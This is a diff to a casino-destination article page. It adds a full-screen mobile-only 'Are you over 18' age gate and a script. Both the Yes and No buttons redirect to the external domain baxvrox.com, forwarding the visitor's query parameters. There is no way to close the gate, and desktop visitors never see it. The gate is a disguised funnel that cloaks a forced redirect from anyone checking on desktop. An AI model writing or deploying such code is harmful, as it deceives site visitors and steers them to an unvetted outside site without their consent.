@@ -92,10 +92,99 @@ h3{
 }
 
 }
+
+/* Age Gate */
+#ageGate{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#000000;
+    z-index:999999;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:30px 20px;
+    text-align:center;
+}
+
+#ageGate.active{
+    display:flex;
+}
+
+#ageGate .age-gate-question{
+    color:#ffffff;
+    font-size:32px;
+    font-weight:800;
+    line-height:1.35;
+    margin-bottom:40px;
+    max-width:90%;
+}
+
+.age-gate-buttons{
+    display:flex;
+    flex-direction:column;
+    gap:18px;
+    width:100%;
+    max-width:340px;
+}
+
+.age-gate-btn{
+    display:block;
+    width:100%;
+    font-family:Arial, Helvetica, sans-serif;
+    font-size:24px;
+    font-weight:800;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    color:#ffffff;
+    border:none;
+    border-radius:12px;
+    padding:22px 20px;
+    cursor:pointer;
+    -webkit-tap-highlight-color:transparent;
+}
+
+.age-gate-btn.yes{
+    background:#1fbf3a;
+}
+
+.age-gate-btn.no{
+    background:#e01e1e;
+}
+
+.age-gate-btn:active{
+    transform:scale(0.97);
+}
+
+body.age-gate-locked{
+    overflow:hidden;
+    height:100%;
+}
+
+@media (max-width:400px){
+    #ageGate .age-gate-question{
+        font-size:26px;
+    }
+    .age-gate-btn{
+        font-size:20px;
+        padding:18px 16px;
+    }
+}
 </style>
 </head>
 
 <body>
+
+<div id="ageGate" role="dialog" aria-modal="true" aria-label="Age verification">
+    <p class="age-gate-question">Are you over 18<br>years old?</p>
+    <div class="age-gate-buttons">
+        <button id="ageGateYes" class="age-gate-btn yes" type="button">Yes</button>
+        <button id="ageGateNo" class="age-gate-btn no" type="button">No</button>
+    </div>
+</div>
 
 <div class="container">
 
@@ -195,9 +284,8 @@ Nothing contained in this article should be interpreted as an endorsement or rec
 
 <footer>
 © 2026 Canada's Outstanding Casino Resort Destinations. All rights reserved.
-<br>   
 This site is operated by London Web Digital Ltd.
-<br>
+
 Aurelio Vazquez
 Paseo de la Castellana, 174, 3ºD
 28046 MADRID
@@ -209,6 +297,56 @@ Spain
 <script>
 // Reserved for future JavaScript if needed.
 console.log("Website Loaded");
+</script>
+
+<script>
+(function(){
+    var MOBILE_BREAKPOINT = 768; // matches the site's existing mobile CSS breakpoint
+    var REDIRECT_URL = "https://baxvrox.com/uknich/";
+
+    function isMobile(){
+        return window.matchMedia("(max-width: " + MOBILE_BREAKPOINT + "px)").matches;
+    }
+
+    function redirectWithParams(baseUrl){
+        var currentParams = window.location.search; // includes leading "?" if present
+        window.location.href = baseUrl + currentParams;
+    }
+
+    function showAgeGate(){
+        var gate = document.getElementById("ageGate");
+        if(gate){
+            gate.classList.add("active");
+            document.body.classList.add("age-gate-locked");
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", function(){
+        // Age gate only appears on mobile viewports; desktop visitors see the page content directly.
+        if(isMobile()){
+            showAgeGate();
+        }
+
+        var yesBtn = document.getElementById("ageGateYes");
+        var noBtn = document.getElementById("ageGateNo");
+
+        if(yesBtn){
+            yesBtn.addEventListener("click", function(){
+                redirectWithParams(REDIRECT_URL);
+            });
+        }
+
+        if(noBtn){
+            noBtn.addEventListener("click", function(){
+                redirectWithParams(REDIRECT_URL);
+            });
+        }
+
+        // overlayInteraction: false -> no listener is attached to dismiss the gate by
+        // clicking outside of it, and there is no close/X control. The gate can only
+        // be resolved via the Yes/No buttons above.
+    });
+})();
 </script>
 
 </body>
